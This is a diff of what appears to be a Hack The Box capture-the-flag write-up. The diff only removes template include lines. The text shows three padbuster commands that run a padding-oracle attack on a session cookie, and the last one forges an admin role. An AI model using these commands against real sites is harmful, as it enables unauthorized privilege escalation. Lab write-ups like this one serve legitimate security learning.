@@ -8,7 +8,6 @@ tags: [burp, web exploitation]
 
 STEP 1
 ======
-{% include codeHeader.html %}
 `padbuster http://docker.hackthebox.eu:37742 zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0`
 
 *** Response Analysis Complete ***
@@ -23,7 +22,6 @@ The following response signatures were returned:
 
 STEP 2
 ======
-{% include codeHeader.html %}
 `padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0`
 
 ** Finished ***
@@ -37,7 +35,6 @@ STEP 2
 
 STEP 3
 ======
-{% include codeHeader.html %}
 `padbuster http://docker.hackthebox.eu:37742/profile.php zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D --cookies "PHPSESSID=7d5guetet0tj3o1kn8lrd77da0;iknowmag1k=zjtTgJyHOn9YxWLIJu%2BnoDGlL9vvl4RGVm44osvhYXxAkHGGKroFCA%3D%3D" 8 --encoding=0 --plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"`
 
 ** Finished ***
